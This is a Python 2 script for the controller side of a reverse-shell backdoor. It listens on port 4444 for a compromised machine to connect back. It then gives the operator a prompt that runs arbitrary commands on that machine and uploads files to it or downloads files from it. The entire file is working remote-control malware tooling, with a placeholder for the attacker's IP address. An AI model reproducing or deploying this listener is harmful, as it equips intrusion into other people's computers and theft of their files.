#!/usr/bin/env python

import socket, json, base64


class Listener:

    def __init__(self, ip, port):
        self.port = port
        self.ip = ip
        # Creating listener
        self.listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Setting listener option
        self.listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.listener.bind((ip, port))
        self.listener.listen(0)
        print("[+] Waiting for incoming connection")
        self.connection, self.address = self.listener.accept()
        print("[+] Got a connection from " + str(self.address))

    def reliable_send(self, data):
        # Converting data into json object
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = ""
        # Receiving json
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_remotely(self, command):
        self.reliable_send(command)
        if command[0] == 'exit':
            self.connection.close()
            exit()

        return self.reliable_receive()

    def write_file(self, path, content):
        with open(path, "wb") as file:
            # Decoding receiving data
            file.write(base64.b64decode(content))
            return "[+] Download successful"

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def run(self):

        while True:
            command = raw_input(">>> ")
            command = command.split(' ')
            try:
                if command[0] == "upload":
                    file_content = self.read_file(command[1])
                    command.append(file_content)
                command_result = self.execute_remotely(command)
                if command[0] == "download" and "[-] Error" not in command_result:
                    self.write_file(command[1], command_result)
                else:
                    print(command_result)
            except Exception:
                command_result = "[-] Error during command execution"


#   Enter your IP
listener00 = Listener("listener IP", 4444)
listener00.run()
#
